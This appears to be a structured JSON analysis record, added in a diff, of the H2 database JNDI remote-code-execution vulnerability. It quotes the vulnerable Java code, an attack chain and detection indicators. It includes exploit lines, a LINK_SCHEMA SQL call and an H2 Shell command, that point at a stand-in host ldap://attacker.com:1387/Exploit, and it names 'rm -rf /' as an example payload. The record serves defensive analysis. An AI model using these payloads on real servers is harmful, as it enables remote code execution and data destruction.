@@ -1,0 +1,154 @@
+{
+  "package_info": {
+    "package_name": "com.h2database:h2",
+    "package_manager": "Maven",
+    "package_versions": "All versions before 2.0.206",
+    "why_malicious": "The package contains code paths that allow attacker-controlled JNDI URLs to be passed to javax.naming.Context.lookup, enabling unauthenticated remote code execution (RCE) via remote class loading, similar to Log4Shell. This is exploitable through multiple vectors, most critically via the H2 web console when exposed to remote clients."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "runtime (user login via H2 console web UI)",
+        "file_location": "org.h2.util.JdbcUtils.getConnection (invoked via H2 console web interface)",
+        "required_permissions": [
+          "network",
+          "filesystem",
+          "JNDI remote class loading"
+        ]
+      },
+      "code_snippet": "else if (javax.naming.Context.class.isAssignableFrom(d)) {\n    // JNDI context\n    Context context = (Context) d.getDeclaredConstructor().newInstance();\n    DataSource ds = (DataSource) context.lookup(url);\n    if (StringUtils.isNullOrEmpty(user) && StringUtils.isNullOrEmpty(password)) {\n        return ds.getConnection();\n    }\n    return ds.getConnection(user, password);\n}",
+      "code_language": "java",
+      "code_behavior": "At runtime, the code instantiates a JNDI Context using an attacker-supplied driver class and performs a lookup using an attacker-supplied URL, which can trigger remote class loading and arbitrary code execution.",
+      "malice_analysis": {
+        "why_suspicious": "Accepting attacker-controlled JNDI URLs and driver classes without validation allows remote code execution via remote class loading.",
+        "violated_expectations": "Normal behavior would restrict JNDI lookups to safe, local protocols or sanitize user input. Here, arbitrary remote URLs are accepted and executed.",
+        "similar_legitimate_use": "JNDI lookups are legitimate for internal resource discovery in trusted environments, but not with untrusted user input.",
+        "key_indicators": [
+          "Attacker-controlled driver and URL parameters",
+          "Direct invocation of context.lookup(url) with unsanitized input",
+          "No authentication or input validation before lookup"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "runtime (HTTP request to H2 console servlet)",
+        "file_location": "H2 Console Servlet (doGet/doPost methods)",
+        "required_permissions": [
+          "network",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "public void doGet(HttpServletRequest req, HttpServletResponse resp) {\n    ...\n    String driver = attributes.getProperty(\"driver\", \"\");\n    String url = attributes.getProperty(\"url\", \"\");\n    ...\n    Connection conn = server.getConnection(driver, url, user, password, ...);\n}",
+      "code_language": "java",
+      "code_behavior": "At runtime, the servlet receives HTTP parameters for 'driver' and 'url', which are passed directly to the vulnerable getConnection method, enabling attacker-supplied JNDI lookups and potential RCE.",
+      "malice_analysis": {
+        "why_suspicious": "User-supplied HTTP parameters are used directly in sensitive connection logic, enabling exploitation via crafted requests.",
+        "violated_expectations": "Normal web applications validate and sanitize user input before using it in backend logic, especially for connection parameters.",
+        "similar_legitimate_use": "Dynamic connection configuration is legitimate in admin tools, but should be restricted to trusted users and sanitized.",
+        "key_indicators": [
+          "Direct mapping of HTTP parameters to connection logic",
+          "No input validation or sanitization",
+          "Parameters control sensitive driver and URL fields"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "runtime (SQL stored procedure execution)",
+        "file_location": "LINK_SCHEMA stored procedure",
+        "required_permissions": [
+          "database admin",
+          "network"
+        ]
+      },
+      "code_snippet": "SELECT * FROM LINK_SCHEMA('pwnfr0g', 'javax.naming.InitialContext', 'ldap://attacker.com:1387/Exploit', 'pwnfr0g', 'pwnfr0g', 'PUBLIC');",
+      "code_language": "sql/java",
+      "code_behavior": "At runtime, a privileged SQL stored procedure allows an authenticated DB admin to supply arbitrary driver and URL parameters, which are passed to the vulnerable getConnection method, enabling RCE via JNDI.",
+      "malice_analysis": {
+        "why_suspicious": "Allows arbitrary driver and URL input from SQL, which can be exploited for RCE if an attacker gains admin access or via SQL injection.",
+        "violated_expectations": "Stored procedures should not allow arbitrary code execution via user-supplied parameters.",
+        "similar_legitimate_use": "Legitimate for linking schemas in trusted environments, but not with untrusted or unsanitized input.",
+        "key_indicators": [
+          "Arbitrary driver and URL parameters in stored procedure",
+          "Direct pass-through to vulnerable connection logic",
+          "Potential for privilege escalation via SQL injection"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_4",
+      "execution_context": {
+        "trigger": "runtime (H2 Shell tool command line execution)",
+        "file_location": "org.h2.tools.Shell (command line arguments)",
+        "required_permissions": [
+          "local shell access",
+          "network"
+        ]
+      },
+      "code_snippet": "java -cp h2*.jar org.h2.tools.Shell -driver javax.naming.InitialContext -url ldap://attacker.com:1387/Exploit",
+      "code_language": "shell/java",
+      "code_behavior": "At runtime, if an attacker can control the command line arguments to the H2 Shell tool, they can trigger the vulnerable connection logic and achieve RCE via JNDI.",
+      "malice_analysis": {
+        "why_suspicious": "Command line arguments are used directly in sensitive connection logic, enabling exploitation if attacker input is possible.",
+        "violated_expectations": "Command line tools should validate and restrict sensitive parameters, especially when used in automated or multi-user environments.",
+        "similar_legitimate_use": "Legitimate for advanced users in trusted environments, but dangerous if input is not controlled.",
+        "key_indicators": [
+          "Direct use of command line arguments for driver and URL",
+          "No input validation or restriction",
+          "Potential for exploitation in automated or multi-user setups"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker submits malicious driver class (javax.naming.InitialContext) and JNDI URL (e.g., ldap://attacker.com/Exploit) via H2 console, shell, or SQL procedure.",
+      "implemented_by": [
+        "snippet_2",
+        "snippet_3",
+        "snippet_4"
+      ],
+      "leads_to": "Malicious parameters are passed to the vulnerable getConnection logic."
+    },
+    {
+      "step": 2,
+      "action": "Vulnerable code path in JdbcUtils.getConnection instantiates the attacker-supplied Context and performs a lookup using the attacker-controlled URL.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "JNDI lookup triggers remote class loading from attacker-controlled server."
+    },
+    {
+      "step": 3,
+      "action": "Attacker's LDAP server responds with a reference to a malicious Java class (Exploit.class), which is loaded and executed by the victim server.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Arbitrary code execution on the victim server (e.g., running rm -rf /)."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "JNDI lookups using attacker-controlled URLs (ldap://, rmi://, etc.)",
+      "Dynamic instantiation of javax.naming.Context from user input",
+      "Remote class loading via JNDI in connection logic",
+      "Unusual driver class names in connection attempts"
+    ],
+    "file_indicators": [
+      "H2 console web interface exposed to non-localhost",
+      "Presence of -webAllowOthers or webAllowOthers=true in configuration",
+      "Unusual command line invocations of H2 Shell with custom driver/url"
+    ],
+    "network_indicators": [
+      "Outbound LDAP/RMI/HTTP requests to untrusted or external domains",
+      "JNDI lookups to non-local addresses",
+      "Unexpected traffic to attacker-controlled infrastructure"
+    ],
+    "how_to_detect": "Monitor for JNDI lookups using non-java protocols (ldap, rmi, http) in H2 database logs, especially when the driver class is javax.naming.InitialContext or similar. Flag any H2 console endpoints accessible from non-localhost addresses. Alert on outbound LDAP/RMI/HTTP requests originating from H2 processes. Review configuration files and command line arguments for -webAllowOthers, webAllowOthers=true, or suspicious driver/url parameters. Use data flow analysis to trace user input reaching javax.naming.Context.lookup."
+  }
+}
